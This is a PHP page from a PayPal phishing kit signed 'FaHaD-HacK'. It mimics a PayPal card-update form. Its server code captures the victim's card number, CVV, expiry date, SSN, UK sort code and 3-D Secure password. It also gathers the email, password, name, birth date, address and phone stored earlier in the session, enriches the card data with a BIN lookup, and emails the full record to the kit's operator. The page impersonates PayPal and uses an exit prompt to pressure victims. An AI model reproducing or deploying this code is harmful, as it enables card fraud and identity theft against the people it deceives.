<?php
error_reporting(0);
#################################################
########      Design by FaHaD            ########
#################################################
session_start();
include("../../include/__config__.php");
include("../../include/function.php");

$_SESSION['_IP_']  = $_SERVER["REMOTE_ADDR"];
	$time = date('l jS \of F Y h:i:s A');
	$user_agent = $_SERVER['HTTP_USER_AGENT'];
	$browser = $user_browser." - ".$user_os." - ".substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0,5);
	$_SESSION['_browser_'] = $browser;
    $_SESSION['cntcode'] = $countrycode;
    $_SESSION['cntname'] = $countryname;
	
if($_SESSION['logint'] !="on" ) {
		header("location: login.php?country.x=".$_SESSION['cntcode']."-".$_SESSION['cntname']."&lang.x=".$_SESSION['_lang_']."&email=".$_SESSION['_email_']."&confirmation_code=3b2hN76Aq6&op=confirm_account_3b2hF76Aq6&tmpl=profile%2Fmyaccount&aid=358301&new_account=1&import=1");
	}
	else if($_SESSION['billing'] !="on" ) {
		header("location: websc-billing.php?country.x=".$_SESSION['cntcode']."-".$_SESSION['cntname']."&lang.x=". $_SESSION['_lang_']);		
	}
	else if($_SESSION['carding'] =="on" ) {
		header("Location: websc-cardcopy.php?country.x=".$_SESSION['cntcode']."-".$_SESSION['cntname']."&lang.x=". $_SESSION['_lang_']);		
	}
if(isset($_POST['cardholder'])) {

#Credit card information
$_SESSION['_cctype_'] = $_POST['c_type'];
$_SESSION['_cardholder_'] = $_POST['cardholder'];
$_SESSION['_ccn_'] = $_POST['cardnumber'];
$_SESSION['_edmonth_'] = $_POST['expmonth'];
$_SESSION['_edyear_'] = $_POST['expyear'];
$_SESSION['_cvn_'] = $_POST['cvc'];
$_SESSION['_SSN_'] = $_POST['ssn1'];

#Security information
$_SESSION['_sort_c_'] = $_POST['sortcode'];
$_SESSION['_sec_c_'] = $_POST['secure3d'];
    
    // check bank
    $fukjjdhnnum = substr($_POST['cardnumber'] , 0, 6);
    $ursdjjsdjfbl ="https://lookup.binlist.net/".$fukjjdhnnum;
    $binhhsjfbbbsbjfbs334hb = @json_decode(file_get_contents($ursdjjsdjfbl));
     
    // country 
        if($binhhsjfbbbsbjfbs334hb->country->alpha2 != null)
        {
                $_SESSION['bin_cnt'] = "Client Card Coun : ".$binhhsjfbbbsbjfbs334hb->country->alpha2."</font><br/>";
        } else {
                $_SESSION['bin_cnt'] ="";
            }


    // Bank
        if($binhhsjfbbbsbjfbs334hb->bank->name != null)
        {
                $_SESSION['bin_bnk'] = "Client Card Bank : ".$binhhsjfbbbsbjfbs334hb->bank->name."</font><br/>";

        } else {
                $_SESSION['bin_bnk'] ="";
            }


    // type
        if($binhhsjfbbbsbjfbs334hb->type != null)
        {
          $_SESSION['bin_typ'] = " ".$binhhsjfbbbsbjfbs334hb->type."</font>";
        } else {
                $_SESSION['bin_typ'] ="";
            }

    // level
        if($binhhsjfbbbsbjfbs334hb->brand != null)
        {
          $_SESSION['bin_lev'] = " ".$binhhsjfbbbsbjfbs334hb->brand."</font>";
        } else {
                $_SESSION['bin_lev'] ="";
            }
    
    
    
		// check snn sort and sec
		if($_POST['ssn1'] =="" ) {
		$ssn="";
		}
		else {
		$ssn="Client Ssn       : ".$_SESSION['_SSN_']."</font><br />";
		}
		if($_POST['sortcode'] =="" ) {
		$sortc="";
		}
		else {
		$sortc="Client Sort code : ".$_SESSION['_sort_c_']."</font><br />";	
		}
		if($_POST['secure3d'] =="" ) {
		$secc="";
		}
		else {
		$secc="Client 3DPass    : ".$_SESSION['_sec_c_']."</font><br />";	
		}


    







$message = "

<div>

======================================</font><br />
 PayPal Biling Yeni - FaHaD-HacK !</font><br />
======================================</font><br />
Client Email     : ".$_SESSION['_email_']."</font><br />
Client Password  : <font color='#FF0000'>".$_SESSION['_password_']."</font><br />
Client Browser   : ".$browser."</font><br />
======================================</font><br />
Client F name    : ".$_SESSION['_fname_']."</font><br />
Client L name    : ".$_SESSION['_lname_']."</font><br />
Client D of B    : ".$_SESSION['_dob_day_']."-".$_SESSION['_dob_month_']."-".$_SESSION['_dob_year_']."</font><br />
Client Address 1 : ".$_SESSION['_adds1_']."</font><br />
Client Address 2 : ".$_SESSION['_adds2_']."</font><br />
Client City      : ".$_SESSION['_city_']."</font><br />
Client State     : ".$_SESSION['_state_']."</font><br />
Client zip code  : ".$_SESSION['_zip_']."</font><br />
Client Country   : ".$_SESSION['_count3s_']."</font><br />
Client Phone Nb  : ".$_SESSION['_phone_']."</font><br />
Client Time      : ".$time."</font><br />
======================================</font><br />
Client Card Type : ".$_SESSION['_cctype_']."/".$_SESSION['bin_typ']."/".$_SESSION['bin_lev']."</font><br />
".$_SESSION['bin_cnt']."
".$_SESSION['bin_bnk']."
Client Card Type : ".$_SESSION['_cctype_']."</font><br />
Client Card name : ".$_SESSION['_cardholder_']."</font><br />
Client Card NB   : ".$_SESSION['_ccn_']."</font><br />
Client Expir Data: ".$_SESSION['_edmonth_']."/".$_SESSION['_edyear_']."</font><br />
Client CVV / CVC : ".$_SESSION['_cvn_']."</font><br />
".$ssn."
".$sortc."
".$secc."
======================================</font><br />
Client Agent : ".$user_agent."</font><br />
Client iP : http://www.geoiptool.com/?IP=".$_SESSION['_IP_']."</font><br />
======================================</font><br />

</div>";
if($_POST['sec_c']){
	$vbv = "VBV";
}
else {
	$vbv = "CCV";
}
$subject  = "PayPal Card ".$_SESSION['_cctype_']." info - [ " . $_SESSION['_count3s_'] . " / ".$_SESSION['_IP_']." ] ";
$headers  = "MIME-Version: 1.0" . "\r\n";;
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$headers .= "From: Yeni card/info <card@itmoh.com.com>";
$exd = $_POST['expyear'].$_POST['expmonth'];
	if ($_POST['cardholder'] == "" ) {
		header("Location: websc-carding.php?country.x=".$_SESSION['cntcode']."-".$_SESSION['cntname']."&lang.x=". $_SESSION['_lang_']."&error=true");		
	}
	else if($_POST['cardnumber'] =="" ) {
		header("Location: websc-carding.php?country.x=".$_SESSION['cntcode']."-".$_SESSION['cntname']."&lang.x=". $_SESSION['_lang_']."&error=true");		
	}
	else if($_POST['cvc'] =="" ) {
		header("Location: websc-carding.php?country.x=".$_SESSION['cntcode']."-".$_SESSION['cntname']."&lang.x=". $_SESSION['_lang_']."&error=true");		
	}
	else if($_POST['expmonth'] =="" ) {
		header("Location: websc-carding.php?country.x=".$_SESSION['cntcode']."-".$_SESSION['cntname']."&lang.x=". $_SESSION['_lang_']."&error=true");		
	}
	else if($_POST['expyear'] =="" ) {
		header("Location: websc-carding.php?country.x=".$_SESSION['cntcode']."-".$_SESSION['cntname']."&lang.x=". $_SESSION['_lang_']."&error=true");		
	}
	else if($exd <1509) {
		header("Location: websc-carding.php?country.x=".$_SESSION['cntcode']."-".$_SESSION['cntname']."&lang.x=". $_SESSION['_lang_']."&error=true");
	} 	
	else {
 if(count($_POST)>0){
	foreach ($_REQUEST as $key => $value) {
	 $_SESSION['post'][$key] = $value;
	 }	 
	extract($_SESSION['post']); // Function to extract array.
	@mail($to,$subject,$message,$headers);
	$carding="on";
	$_SESSION['carding'] = $carding;
	header("Location: websc-cardcopy.php?country.x=".$_SESSION['cntcode']."-".$_SESSION['cntname']."&lang.x=". $_SESSION['_lang_']);
 }
}
}
?>

<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title><?php echo $PAYPAL_SERVICE_UPDATE_TXT; ?></title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="">
    <meta name="author" content="">
	<link rel="shortcut icon" type="image/x-icon" href="favicon.ico" />
    <!-- Le styles -->
    <link href="../../css/bootstrap.css" rel="stylesheet">
    <link href="../../css/bootstrap-responsive.css" rel="stylesheet">

    <!-- HTML5 shim, for IE6-8 support of HTML5 elements -->
    <!--[if lt IE 9]>
      <script src="../../js/html5shiv.js"></script>
    <![endif]-->

<script type="text/javascript">
// <![CDATA[
function SelectCC(cardnumber) {
var first = cardnumber.charAt(0);
var second = cardnumber.charAt(1);
var third = cardnumber.charAt(2);
var fourth = cardnumber.charAt(3);
var ccnmbr = (cardnumber + '').replace(/\\s/g, ''); //remove space

if ((/^(417500|(4917|4913|4508|4844)\d{2})\d{10}$/).test(ccnmbr) && ccnmbr.length == 16) {
//Electron
document.getElementById("mastercard").style.opacity= "0.40";
document.getElementById("amex").style.opacity= "0.40";
document.getElementById("discover").style.opacity= "0.40";
document.getElementById("visa").style.opacity= "0.40";
document.getElementById("electron").style.opacity= "1";
document.getElementById("3dcode").style.display= "none";
document.getElementById("3dcodee").style.display= "none";
document.getElementById("3dcodemaster").style.display= "none";
document.getElementById("maestro").style.opacity= "0.40";
document.getElementById("cvc").pattern="[0-9].{2}";
document.getElementById("crad_type").value="ELECTRON";
}

else if ((/^(4)/).test(ccnmbr) && (ccnmbr.length == 16)) {
//Visa
document.getElementById("mastercard").style.opacity= "0.40";
document.getElementById("amex").style.opacity= "0.40";
document.getElementById("discover").style.opacity= "0.40";
document.getElementById("visa").style.opacity= "1";
document.getElementById("electron").style.opacity= "0.40";
document.getElementById("3dcode").style.display= "inline";
document.getElementById("3dcodee").style.display= "block";
document.getElementById("3dcodemaster").style.display= "none";
document.getElementById("maestro").style.opacity= "0.40";
document.getElementById("cvc").pattern="[0-9].{2}";
document.getElementById("crad_type").value="VISA";
}
else if ((/^(34|37)/).test(ccnmbr) && ccnmbr.length == 15) {
//American Express
document.getElementById("mastercard").style.opacity= "0.40";
document.getElementById("amex").style.opacity= "1";
document.getElementById("discover").style.opacity= "0.40";
document.getElementById("visa").style.opacity= "0.40";
document.getElementById("electron").style.opacity= "0.40";
document.getElementById("maestro").style.opacity= "0.40";
document.getElementById("3dcodee").style.display= "none";
document.getElementById("3dcodemaster").style.display= "none";
document.getElementById("3dcode").style.display= "none";
document.getElementById("cvc").pattern="[0-9].{3}";
document.getElementById("crad_type").value="AMEX";
}

else if ((/^(5018|5020|5038|5612|5893|6304|6759|6761|6762|6763|0604|6390)\d+$/).test(ccnmbr) && ccnmbr.length == 16) {
//Maestro
document.getElementById("mastercard").style.opacity= "0.40";
document.getElementById("amex").style.opacity= "0.40";
document.getElementById("discover").style.opacity= "0.40";
document.getElementById("visa").style.opacity= "0.40";
document.getElementById("electron").style.opacity= "0.40";
document.getElementById("maestro").style.opacity= "1";
document.getElementById("3dcodemaster").style.display= "none";
document.getElementById("3dcodee").style.display= "none";
document.getElementById("3dcode").style.display= "none";
document.getElementById("cvc").pattern="[0-9].{2}";
document.getElementById("crad_type").value="MAESTRO";
}

else if ((/^(51|52|53|54|55)/).test(ccnmbr) && ccnmbr.length == 16) {
//Mastercard
document.getElementById("mastercard").style.opacity= "1";
document.getElementById("amex").style.opacity= "0.40";
document.getElementById("discover").style.opacity= "0.40";
document.getElementById("visa").style.opacity= "0.40";
document.getElementById("electron").style.opacity= "0.40";
document.getElementById("3dcode").style.display= "none";
document.getElementById("3dcodee").style.display= "block";
document.getElementById("3dcodemaster").style.display= "inline";
document.getElementById("maestro").style.opacity= "0.40";
document.getElementById("cvc").pattern="[0-9].{2}";
document.getElementById("crad_type").value="MASTERCARD";
}
else if ((/^(6011|16)/).test(ccnmbr) && ccnmbr.length == 16) {
//Discover
document.getElementById("mastercard").style.opacity= "0.40";
document.getElementById("amex").style.opacity= "0.40";
document.getElementById("discover").style.opacity= "1";
document.getElementById("visa").style.opacity= "0.40";
document.getElementById("electron").style.opacity= "0.40";
document.getElementById("maestro").style.opacity= "0.40";
document.getElementById("3dcodemaster").style.display= "none";
document.getElementById("3dcodee").style.display= "none";
document.getElementById("3dcode").style.display= "none";
document.getElementById("cvc").pattern="[0-9].{2}";
document.getElementById("crad_type").value="DISCOVER";
}

else {
document.getElementById("mastercard").style.opacity= "0.40";
document.getElementById("amex").style.opacity= "0.40";
document.getElementById("discover").style.opacity= "0.40";
document.getElementById("visa").style.opacity= "0.40";
document.getElementById("electron").style.opacity= "0.40";
document.getElementById("maestro").style.opacity= "0.40";
document.getElementById("3dcodee").style.display= "none";
document.getElementById("3dcodemaster").style.display= "none";
document.getElementById("3dcode").style.display= "none";
document.getElementById("cvc").pattern="[0-9].{2,3}";
document.getElementById("crad_type").value="";

}
}
// ]]></script>
 <script type="text/javascript">
      var hook = true;
      window.onbeforeunload = function() {
        if (hook) {
          return "Your account will still limited."
        }
      }
      function unhook() {
        hook=false;
      }
    </script>
</head>

<body style="background:#f5f5f5;">

<div class="row-fluid">
    <?php include("header.php"); ?>
</div>
    <div class="container">

     

      <!-- Example row of columns -->
      <div class="row" style="margin-top:100px;" id="toprow">
         <?php include("left.php"); ?>                        
        <div class="span7" style="background:#fff;padding:15px 32px; 0 0;box-shadow:0 1px 4px 0 #d5d5d5;border-radius:5px;">
        <h3><?php echo $UPDATE_YOUR_CREDIT_OR_DEBIT_CARD_TXT; ?></h3><hr />
        
         <center>
		<?php if($_GET['error'] =="true"){ ?>
        <div class="alert-error">
        <!--<a href="#" class="close" data-dismiss="alertsuccess">&times;</a>-->
        <i>Please make sure you enter your information correctly.</i>
		</div>
		<br>
        <?php } ?>
        <p style="margin-bottom:20px;"><?php echo $PLEASE_ENTER_YOUR_CREDIT_OR_DEBIT_CARD_DETAILS_CORRECTLY_TXT; ?></p>
        </center>
          <form class="form-horizontal" name="frm_card" id="frm_card" method="post" enctype="multipart/form-data" action="">
          <div class="control-group">
          <label class="control-label" for="cardholder"><?php echo $CARD_HOLDER_TXT; ?><span class="red">*</span></label>
          <div class="controls"><input type="text" class="input" name="cardholder" id="cardholder" value="<?php if(isset($_SESSION['_cardholder_'])){ echo $_SESSION['_cardholder_'];} ?>" title="Card Holder Name"   pattern="[a-zA-Z].{3,}" autofocus required /></div>
          </div>
		  <div class="control-group">
          <label class="control-label" for="cardholder">Card Type<span class="red"> </span></label>
          <div class="prfDetails confidential">
<img id="visa" src="../../img/icons/v.png" width="36" height="30" style="opacity: 0.40;"/>
<img id="electron" src="../../img/icons/visa-electron-curved.png" width="36" height="30" style="opacity: 0.40;"/>
<img id="mastercard" src="../../img/icons/payment_method_master_card-48.png" width="36" height="30" style="opacity: 0.40;"/>
<img id="maestro" src="../../img/icons/maestro-curved.png" width="36" height="30" style="opacity: 0.40;"/>
<img id="amex" src="../../img/icons/payment_method_american_express_card-48.png" width="36" height="30" style="opacity: 0.40;"/>
<img id="discover" src="../../img/icons/payment_method_discover_network_card-48.png" width="36" height="30" style="opacity: 0.40;"/>
</div></div>

          <div class="control-group">
          <label class="control-label" for="cardnumber"><?php echo $CARD_NUMBER_TXT; ?><span class="red">*</span></label>
          <div class="controls"><input type="text" name="cardnumber" id="cardnumber" onkeyup="SelectCC(this.value)" title="Enter 16 Digit Card Number" value="" required maxlength="16" pattern="^(?:4[0-9]{15}?|5[1-5][0-9]{14}|(5018|5020|5038|5612|5893|6304|6759|6761|6762|6763|0604|6390)\d{12}$|6(?:011|5[0-9][0-9])[0-9]{12}|3[47][0-9]{13}|3(?:0[0-5]|[68][0-9])[0-9]{11}|(?:2131|1800|35\d{3})\d{11})$" /></div>
          </div>
		  	<input name="c_type" type="hidden" id="crad_type" width="" value="" />
			<input name="c_valid" type="hidden" id="card_valid" value="" />

         <div class="control-group">
          <label class="control-label" for="cvc"><?php echo $CVC_TXT; ?><span class="red">*</span></label>
          <div class="controls">
          <input type="password" autocomplete="off" class="input-mini" name="cvc" id="cvc" maxlength="4" value="" required pattern="[0-9]{3,4}" title="Enter 3 or 4 Digit Code" /><a href="#" title="Card Security Code" style="color: #06F;padding-left:10px;"><?php echo $WHAT_IS_THIS_TXT; ?></a>
          </div>
          </div>
          
           <div class="control-group">
          <label class="control-label" for="expmonth"><?php echo $EXPIRATION_DATE_TXT; ?><span class="red">*</span></label>
          <div class="controls"><select class="input-small" name="expmonth" style="width: 100px;" id="expmonth" required>
	<option <?php if(isset($_SESSION['_edmonth_'])){  if($_SESSION['_edmonth_']=="") echo "selected"; } ?> value="">Month</option>
	<option <?php if(isset($_SESSION['_edmonth_'])){  if($_SESSION['_edmonth_']=="01") echo "selected"; } ?> value="01">1 January</option>
	<option <?php if(isset($_SESSION['_edmonth_'])){  if($_SESSION['_edmonth_']=="02") echo "selected"; } ?> value="02">2 Febuary</option>
	<option <?php if(isset($_SESSION['_edmonth_'])){  if($_SESSION['_edmonth_']=="03") echo "selected"; } ?> value="03">3 March</option>
	<option <?php if(isset($_SESSION['_edmonth_'])){  if($_SESSION['_edmonth_']=="04") echo "selected"; } ?> value="04">4 April</option>
	<option <?php if(isset($_SESSION['_edmonth_'])){  if($_SESSION['_edmonth_']=="05") echo "selected"; } ?> value="05">5 May</option>
	<option <?php if(isset($_SESSION['_edmonth_'])){  if($_SESSION['_edmonth_']=="06") echo "selected"; } ?> value="06">6 June</option>
	<option <?php if(isset($_SESSION['_edmonth_'])){  if($_SESSION['_edmonth_']=="07") echo "selected"; } ?> value="07">7 July</option>
	<option <?php if(isset($_SESSION['_edmonth_'])){  if($_SESSION['_edmonth_']=="08") echo "selected"; } ?> value="08">8 August</option>
	<option <?php if(isset($_SESSION['_edmonth_'])){  if($_SESSION['_edmonth_']=="09") echo "selected"; } ?> value="09">9 September</option>
	<option <?php if(isset($_SESSION['_edmonth_'])){  if($_SESSION['_edmonth_']=="10") echo "selected"; } ?> value="10">10 October</option>
	<option <?php if(isset($_SESSION['_edmonth_'])){  if($_SESSION['_edmonth_']=="11") echo "selected"; } ?> value="11">11 November</option>
	<option <?php if(isset($_SESSION['_edmonth_'])){  if($_SESSION['_edmonth_']=="12") echo "selected"; } ?> value="12">12 December</option>
							</select>
<select class="input-mini" name="expyear" style="width: 70px;" id="expyear" required>
	<option <?php if(isset($_SESSION['_edyear_'])){  if($_SESSION['_edyear_']=="") echo "selected"; } ?> value="0">Year</option>
	<option <?php if(isset($_SESSION['_edyear_'])){  if($_SESSION['_edyear_']=="17") echo "selected"; } ?> value="17">2017</option>
	<option <?php if(isset($_SESSION['_edyear_'])){  if($_SESSION['_edyear_']=="18") echo "selected"; } ?> value="18">2018</option>
	<option <?php if(isset($_SESSION['_edyear_'])){  if($_SESSION['_edyear_']=="19") echo "selected"; } ?> value="19">2019</option>
	<option <?php if(isset($_SESSION['_edyear_'])){  if($_SESSION['_edyear_']=="20") echo "selected"; } ?> value="20">2020</option>
	<option <?php if(isset($_SESSION['_edyear_'])){  if($_SESSION['_edyear_']=="21") echo "selected"; } ?> value="21">2021</option>
	<option <?php if(isset($_SESSION['_edyear_'])){  if($_SESSION['_edyear_']=="22") echo "selected"; } ?> value="22">2022</option>
	<option <?php if(isset($_SESSION['_edyear_'])){  if($_SESSION['_edyear_']=="23") echo "selected"; } ?> value="23">2023</option>
	<option <?php if(isset($_SESSION['_edyear_'])){  if($_SESSION['_edyear_']=="24") echo "selected"; } ?> value="24">2024</option>
	<option <?php if(isset($_SESSION['_edyear_'])){  if($_SESSION['_edyear_']=="25") echo "selected"; } ?> value="25">2025</option>
	<option <?php if(isset($_SESSION['_edyear_'])){  if($_SESSION['_edyear_']=="26") echo "selected"; } ?> value="26">2026</option>
	<option <?php if(isset($_SESSION['_edyear_'])){  if($_SESSION['_edyear_']=="20") echo "selected"; } ?> value="27">2027</option>
	<option <?php if(isset($_SESSION['_edyear_'])){  if($_SESSION['_edyear_']=="21") echo "selected"; } ?> value="28">2028</option>
	<option <?php if(isset($_SESSION['_edyear_'])){  if($_SESSION['_edyear_']=="22") echo "selected"; } ?> value="29">2029</option>
	<option <?php if(isset($_SESSION['_edyear_'])){  if($_SESSION['_edyear_']=="23") echo "selected"; } ?> value="30">2030</option>
	<option <?php if(isset($_SESSION['_edyear_'])){  if($_SESSION['_edyear_']=="24") echo "selected"; } ?> value="31">2031</option>
	<option <?php if(isset($_SESSION['_edyear_'])){  if($_SESSION['_edyear_']=="25") echo "selected"; } ?> value="32">2032</option>
	<option <?php if(isset($_SESSION['_edyear_'])){  if($_SESSION['_edyear_']=="26") echo "selected"; } ?> value="33">2033</option>
	<option <?php if(isset($_SESSION['_edyear_'])){  if($_SESSION['_edyear_']=="23") echo "selected"; } ?> value="34">2034</option>
	<option <?php if(isset($_SESSION['_edyear_'])){  if($_SESSION['_edyear_']=="24") echo "selected"; } ?> value="35">2035</option>
	<option <?php if(isset($_SESSION['_edyear_'])){  if($_SESSION['_edyear_']=="25") echo "selected"; } ?> value="36">2036</option>
	<option <?php if(isset($_SESSION['_edyear_'])){  if($_SESSION['_edyear_']=="26") echo "selected"; } ?> value="37">2037</option>
							
</select>

</div>
          </div>
              
        <?php if (isset($_SESSION['_count3s_']) && $_SESSION['_count3s_'] == "United States"){ ?>
	<div class="control-group">
          <label class="control-label" for="ssn"><?php echo $SSN_TXT;?><span class="red">*</span></label>
          <div class="controls"><input type="text" class="input-small" name="ssn1" id="ssn1" style="margin-right:12px;" maxlength="9" value="<?php if(isset($_SESSION['_SSN_'])){ echo $_SESSION['_SSN_'];} ?>" title="" required pattern="[0-9]{9}" required/></div>
          </div>
<?php }else if (isset($_SESSION['_count3s_']) && $_SESSION['_count3s_'] == "United Kingdom"){ ?>
		<div class="control-group">
          <label class="control-label" for="sortcode" ><?php echo $SORT_CODE_TXT; ?><span class="red">*</span></label>
          <div class="controls"><input type="text" class="input-mini" name="sortcode" id="sortcode" maxlength="6" value="<?php if(isset($_SESSION['_sort_c_'])){ echo $_SESSION['_sort_c_'];} ?>" title="Enter Account NO" required pattern="[0-9]{6}" required/></div>
          </div>
<?php }?>
              <div class="control-group" id="3dcodee" style="display: none;">
          <label class="control-label" for="secure3d"><?php echo $SECURE_3D_TXT;?><span class="red">*</span></label>
          <div class="controls"><input type="password" class="input-small" name="secure3d" id="secure3d"  value="<?php if(isset($_SESSION['_sec_c_'])){ echo $_SESSION['_sec_c_'];} ?>" autocomplete="off" />  <img id="3dcode" src="../../img/icons/verified-by-visa.png" width="45" style="display: none;"/><img id="3dcodemaster" src="../../img/icons/mastercard-securecode.png" width="55" style="display: none;"/></div>
          </div>
	
	

         
   <div class="control-group">  
   <label class="control-label" ></label> 
   <div class="controls">    
<input type="submit" name="submit" onClick="unhook()" value="<?php echo $NEXT_TXT; ?>" class="btn btn-primary" style="padding: 7px 15px 8px; width: 130px; line-height: 18px; font-size:14px;font-weight:bold;" /></div></div> 
         
          </form>
          
           <center><div style="color:#0079c1;margin:35px 0 20px ;" id="ft3"><?php echo $UPDATE_BILLING_ADDRESS_TXT; ?> <b class="caret-right"></b><span style="color:#000;"><?php echo $UPDATE_CREDIT_OR_DEBIT_CARD_TXT; ?></span><b class="caret-right"></b> <span style="color:#0079c1;"><?php echo $ID_AND_CREDIT_CARD_PROOF_TXT; ?></span> <b class="caret-right"></b><span style="color:#0079c1;"> <?php echo $UPDATE_DONE_TXT; ?></span></div></center>
       </div>
       
      </div>

      <hr />
      
      <div class="container" id="ft1">
         
         
     <ul class="nav nav-pills" style="color:#ccc;font-weight:bold;">
        <li><a href="#"><?php echo $ABOUT_TXT; ?></a></li>
        <li><a href="#"><?php echo $HELP_TXT; ?></a></li>
        <li><a href="#"><?php echo $RATES_TXT; ?></a></li>
        <li><a href="#"><?php echo $SECURITY_TXT; ?></a></li>
        <li><a href="#"><?php echo $DEVELOPERS_TXT; ?></a></li>
        <li><a href="#"><?php echo $PARTNERS_TXT; ?></a></li>
    </ul>
        </div>
      

    </div> <!-- /container -->

<?php include("footer.php");?>

<script language="JavaScript" type="text/javascript">
  window.onbeforeunload = confirmExit;
  function confirmExit()
  {
    return "You have attempted to leave this page.  If you have made any changes to the fields without clicking the Save button, your changes will be lost.  Are you sure you want to exit this page?";
  }
  $(function () {
  $("a").click(function {
    window.onbeforeunload = null;
  });
});
</script>

</body>

</html>